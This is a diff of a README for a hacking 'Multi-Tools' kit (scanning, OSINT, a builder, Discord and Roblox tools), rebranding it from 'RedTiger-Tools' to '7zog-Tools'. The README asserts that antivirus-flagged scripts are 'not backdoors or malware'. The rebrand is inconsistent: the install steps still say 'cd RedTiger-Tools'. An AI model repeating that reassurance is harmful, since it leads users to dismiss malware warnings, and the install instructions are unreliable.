@@ -1,16 +1,16 @@
 <img align="center" src="Img/7zog-Banner.png" width="100%"> 
 
 <h1 align="center">Multi-Tools</h1>
-
+ 
 <p align="center">
    <a href="https://t.me/7zog">Telegram</a> ・ <a href="https://guns.lol/og_">Website</a> ・ <a href="https://www.trustpilot.com/review/7zProject.com">Reviews</a>
 </p>
 
 <p align="center">
-  <img src="https://img.shields.io/github/v/release/7zog/Project7z?style=plastic&label=Version&color=d90000">
-  <img src="https://img.shields.io/github/stars/7zog/Project7z?style=plastic&label=Stars&color=d90000">
-  <img src="https://img.shields.io/github/repo-size/7zog/Project7z?style=plastic&label=Size&color=d90000">
-  <img src="https://img.shields.io/github/languages/top/7zog/Project7z?style=plastic&color=d90000">
+  <img src="https://img.shields.io/github/v/release/7zog/7zog-Tools?style=plastic&label=Version&color=d90000">
+  <img src="https://img.shields.io/github/stars/7zog/7zog-Tools?style=plastic&label=Stars&color=d90000">
+  <img src="https://img.shields.io/github/repo-size/7zog/7zog-Tools?style=plastic&label=Size&color=d90000">
+  <img src="https://img.shields.io/github/languages/top/7zog/7zog-Tools?style=plastic&color=d90000">
 </p>
 
 <p>
@@ -27,16 +27,17 @@
   - 🔄 -> <strong>Frequently updated</strong>.<br>
   - 💰 -> <strong>Free</strong> for everyone.<br>
   - 🎈 -> <strong>The tools</strong> include: Scanning, Osint, Utilities, Builder, Roblox, Discord, And more...<br>
+  <br>
 <p>
 </p>
 
 <h1 align="center">Tools</h1>
 
 <p align="center">
-  <img src="Img/RedTiger.png" width="49%"> 
-  <img src="Img/RedTiger-2.png" width="49%"> 
-  <img src="Img/RedTiger-3.png" width="49%"> 
-  <img src="Img/Builder.png" width="49%">
+  <img src="Img/7zog.png" width="49%"> 
+  <img src="Img/7zog-2.png" width="49%"> 
+  <img src="Img/7zog-3.png" width="49%"> 
+  <img src="Img/7zog-Builder.png" width="49%">
   <br><br>
 </p>
 
@@ -44,7 +45,7 @@
 <p>
    
 ```
-┌── ⚒️ - RedTiger-Tools
+┌── ⚒️ - 7zog-Tools
 │   ├── Info
 │   └── Site
 │
@@ -165,7 +166,7 @@
 
 <h1 align="center">Installation</h1>
 
-<a href="https://github.com/loxy0dev/RedTiger-Tools/archive/refs/tags/v6.3.zip">Dowloads "RedTiger-Tools.zip" Here</a>
+<a href="https://github.com/7zog/7zog-Tools/archive/refs/tags/v2.0.zip">Downloads "7zog-Tools.zip" Here</a>
 
 <p>
   
@@ -177,7 +178,7 @@
 Or
 ```
 1 - Open a terminal.
-2 - Write "git clone https://github.com/loxy0dev/RedTiger-Tools.git"
+2 - Write "git clone https://github.com/7zog/7zog-Tools.git"
 3 - Write "cd RedTiger-Tools"
 4 - Write "git pull"
 5 - Write "python Setup.py"
@@ -189,10 +190,10 @@ Or
 
 <p>
   
-  - RedTiger Tools has been developed solely for educational purposes.<br>
+  - 7zog Tools has been developed solely for educational purposes.<br>
   - This project has been created with good intentions and is intended for personal use only.<br>
   - By choosing to use RedTiger, you acknowledge and accept full responsibility for any consequences that may result from your actions.<br>
-  - All scripts in the "<a href="https://github.com/loxy0dev/RedTiger-Tools/tree/main/Program/FileDetectedByAntivirus">Program/FileDetectedByAntivirus</a>" folder are <strong>detected by the antivirus</strong> but pose no threat to you. These are <strong>not backdoors or malware</strong>.
+  - All scripts in the "<a href="https://github.com/7zog/7zog-Tools/tree/main/Program/FileDetectedByAntivirus">Program/FileDetectedByAntivirus</a>" folder are <strong>detected by the antivirus</strong> but pose no threat to you. These are <strong>not backdoors or malware</strong>.
 <br><br>
 </p>
 
@@ -202,11 +203,11 @@ Or
   
   <strong>Bitcoin Adress:</strong>
   ``` 
-1MSRzopmhasr9ByHBrksScqv6wByVagDKe
+Soon...
   ```
   <strong>Litecoin Adress:</strong>
   ```
-LXXnPk5hbUxNomJixbysoikZSv6QAiQyVQ
+Soon...
   ```
 
 </p>
